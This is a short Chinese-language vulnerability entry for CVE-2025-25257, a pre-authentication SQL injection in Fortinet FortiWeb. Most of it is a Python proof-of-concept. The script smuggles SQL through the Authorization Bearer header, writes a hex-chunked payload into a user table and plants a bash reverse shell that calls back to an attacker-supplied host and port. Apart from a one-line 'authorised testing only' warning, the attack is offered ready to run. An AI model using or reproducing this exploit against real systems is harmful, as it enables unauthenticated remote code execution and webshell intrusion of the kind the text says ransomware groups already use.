### 漏洞描述
CVE-2025-25257 是 Fortinet FortiWeb 中的严重 SQL 注入漏洞。未经认证的攻击者可通过发送精心构造的 HTTP/HTTPS 请求，在 FortiWeb 上执行未经授权的 SQL 代码或命令。该漏洞已被勒索软件团伙大规模利用，webshell 植入活动持续进行。

### ⚠️ 安全警告
PoC 中包含反弹 Shell 示例，仅限授权测试环境使用。

### POC/利用
```python
#!/usr/bin/env python3
# CVE-2025-25257 - FortiWeb Pre-Auth SQLi to RCE
# watchTowr Detection Artifact Generator

import requests

def exploit(target, lhost, lport):
    # SQL注入通过 Authorization header
    # 利用 Bearer token 注入 SQL 语句
    # 通过 UPDATE fabric_user.user_table 写入 webshell
    
    payload = f'import os; os.system("bash -c \'/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\'")'
    encoded_hex = payload.encode().hex()
    chunks = [encoded_hex[i:i+10] for i in range(0, len(encoded_hex), 10)]
    
    for idx, chunk in enumerate(chunks):
        if idx == 0:
            sql = f"SET/**/token=UNHEX('{chunk}')"
        else:
            sql = f"SET/**/token=CONCAT(token,UNHEX('{chunk}'))"
        
        header_payload = f"Bearer '/**/;UPDATE/**/fabric_user.user_table/**/{sql};SELECT/**/'1'"
        headers = {'Authorization': header_payload}
        requests.get(f"{target}/api/fabric/device/status", headers=headers, verify=False)
```
